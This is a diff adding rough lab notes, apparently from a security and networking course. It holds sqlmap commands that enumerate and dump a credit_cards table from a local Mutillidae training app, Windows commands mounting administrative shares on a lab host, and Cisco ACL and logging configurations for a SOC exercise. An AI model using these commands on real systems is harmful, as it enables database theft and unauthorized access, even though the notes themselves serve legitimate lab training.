@@ -1,0 +1,93 @@
+Username=admin
+Password=adminpass
+Signature=g0t r00t?
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" --current-db
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass-info-php-submit-button=View+Account+Details" -D mutillidae --tables
+
+sqlmap --url="https://127.0.0.1/mutillidae/src/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details" -D mutillidae -T credit_cards --dump
+
+
+
+@cucm
+conf t
+ip route 0.0.0.0 0.0.0.0 10.22.100.4
+do ping 10.22.100.4
+
+how to attack/hack anything. the way handshake.
+
+
+hacker/attacker/attack/source    	vs   	victim/desti/defense
+show control-plane host open-ports
+tcp.flags.syn == 1
+tcp.flags.syn == 1 &&  
+
+10.22.1.10			vs    	CUCM:10.22.100.8
+SIP: 10.22.1.21
+SIP
+sPORT: random: usually 1000++
+DPORT: 2000
+
+
+net use x: /delete
+net use \\10.22.1.10\ipc$
+net use \\10.22.1.10\c$
+net use x: \\10.22.1.10\c$
+netstat -ano
+
+
+
+
+ex.1: you are the Blue Team/SOC guys for pogo sites:
+www.ebet10.com phoneBettingSite: 1720,2000, 5060, 5061
+www.ebet11.com webappBettingSite: 80,443,22,ping
+
+Config t
+ip host ebet10.com 192.168.102.10
+ip host ebet11.com 192.168.102.11
+service timestamps log datetime
+service timestamps debug datetime
+logging 10.22.1.10
+logging trap 5
+!! HOW TO SUMBONG TO SPLUNK LOGS
+NO IP access-list Extended NGFW2
+IP access-list Extended NGFW2
+ Permit tcp Any host ebet10.com eq 1720 log
+ Permit tcp Any host ebet10.com eq 2000 log
+Permit tcp Any host ebet10.com eq 5060 log
+Permit tcp Any host ebet10.com eq 5061 log
+ Permit tcp Any host ebet11.com eq 80 log
+ Permit tcp Any host ebet11.com eq 443 log
+ Permit tcp Any host ebet11.com eq 22 log
+ Permit tcp Any host ebet11.com  log
+ Int Gi 3
+  ip access-group NGFW2 in
+
+
+
+ex.1b: you are the Blue Team/SOC guys for pogo sites:
+www.ebet10.com phoneBettingSite: 22,53,443 2000, ping
+www.ebet11.com webappBettingSite: 80,1720,5060,5061
+
+Config t
+ip host ebet10.com 192.168.102.10
+ip host ebet11.com 192.168.102.11
+service timestamps log datetime
+service timestamps debug datetime
+logging 10.22.1.10
+logging trap 5
+!! HOW TO SUMBONG TO SPLUNK LOGS
+NO IP access-list Extended NGFW3
+IP access-list Extended NGFW3
+ Permit tcp Any host ebet10.com eq 22 log
+ Permit tcp Any host ebet10.com eq 53 log
+Permit tcp Any host ebet10.com eq 443 log
+Permit tcp Any host ebet10.com eq 2000 log
+Permit tcp Any host ebet10.com log
+ Permit tcp Any host ebet11.com eq 80 log
+ Permit tcp Any host ebet11.com eq 1720 log
+ Permit tcp Any host ebet11.com eq 5060 log
+Permit tcp Any host ebet11.com eq 5061 log
+ Int Gi 3
+  ip access-group NGFW3 in
